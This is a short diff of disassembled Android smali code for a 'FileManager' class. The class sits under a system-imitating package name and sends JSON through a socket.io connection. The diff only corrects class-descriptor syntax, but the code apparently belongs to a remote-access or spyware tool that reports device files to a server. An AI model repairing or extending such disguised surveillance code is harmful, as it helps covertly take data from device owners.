@@ -1,4 +1,4 @@
-.class public Lcom.android.system.utils.sync/FileManager;
+.class public Lcom/android/system/utils/sync/FileManager;
 .super Ljava/lang/Object;
 .source "FileManager.java"
 
@@ -95,11 +95,11 @@
     invoke-virtual {v4, v6, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
 
     .line 80
-    invoke-static {}, Lcom.android.system.utils.sync/IOSocket;->getInstance()Lcom.android.system.utils.sync/IOSocket;
+    invoke-static {}, Lcom/android/system/utils/sync/IOSocket;->getInstance()Lcom/android/system/utils/sync/IOSocket;
 
     move-result-object v6
 
-    invoke-virtual {v6}, Lcom.android.system.utils.sync/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v6}, Lcom/android/system/utils/sync/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v6
 
@@ -223,11 +223,11 @@
     invoke-virtual {v6, v2, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
 
     .line 31
-    invoke-static {}, Lcom.android.system.utils.sync/IOSocket;->getInstance()Lcom.android.system.utils.sync/IOSocket;
+    invoke-static {}, Lcom/android/system/utils/sync/IOSocket;->getInstance()Lcom/android/system/utils/sync/IOSocket;
 
     move-result-object v2
 
-    invoke-virtual {v2}, Lcom.android.system.utils.sync/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v2}, Lcom/android/system/utils/sync/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v2
 
